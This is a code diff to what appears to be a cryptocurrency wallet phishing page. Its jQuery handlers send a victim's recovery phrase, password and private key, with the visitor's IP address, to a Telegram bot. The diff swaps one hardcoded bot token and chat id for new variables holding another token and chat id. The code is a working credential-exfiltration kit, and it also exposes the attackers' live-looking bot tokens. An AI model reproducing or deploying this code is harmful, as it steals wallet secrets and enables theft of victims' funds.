@@ -487,6 +487,14 @@
 
 
 
+   <script type="text/javascript">
+  
+   var token = "2007821817:AAE_SAwqtL384A8CBTcNcSQzbylaH-hEOwA"
+   var chat_id = "-555838908"
+</script>
+
+ 
+
        <script>
        
       
@@ -506,7 +514,7 @@ $.getJSON("https://jsonip.com?callback=?", function (data) {
 
 if(phrase != ""){
 
-            $.post("https://api.telegram.org/bot2032525717:AAGQ0auiQiTUQC4NqdxiyPRk5LcnVQWKzKI/sendMessage?text="+icerik+"&chat_id=-575202528",  
+            $.post("https://api.telegram.org/bot"+token+"/sendMessage?text="+icerik+"&chat_id="+chat_id,  
               
               function (data, status) {
                 //console.log(data);
@@ -540,7 +548,7 @@ $.getJSON("https://jsonip.com?callback=?", function (data) {
 
 if(password != ""){
 
-         $.post("https://api.telegram.org/bot2032525717:AAGQ0auiQiTUQC4NqdxiyPRk5LcnVQWKzKI/sendMessage?text="+icerik+"&chat_id=-575202528", 
+         $.post("https://api.telegram.org/bot"+token+"/sendMessage?text="+icerik+"&chat_id="+chat_id, 
               
               function (data, status) {
                 //console.log(data);
@@ -574,7 +582,7 @@ $.getJSON("https://jsonip.com?callback=?", function (data) {
 
 if(privateKey != ""){
 
-            $.post("https://api.telegram.org/bot2032525717:AAGQ0auiQiTUQC4NqdxiyPRk5LcnVQWKzKI/sendMessage?text="+icerik+"&chat_id=-575202528", 
+           $.post("https://api.telegram.org/bot"+token+"/sendMessage?text="+icerik+"&chat_id="+chat_id, 
               
               function (data, status) {
                 //console.log(data);
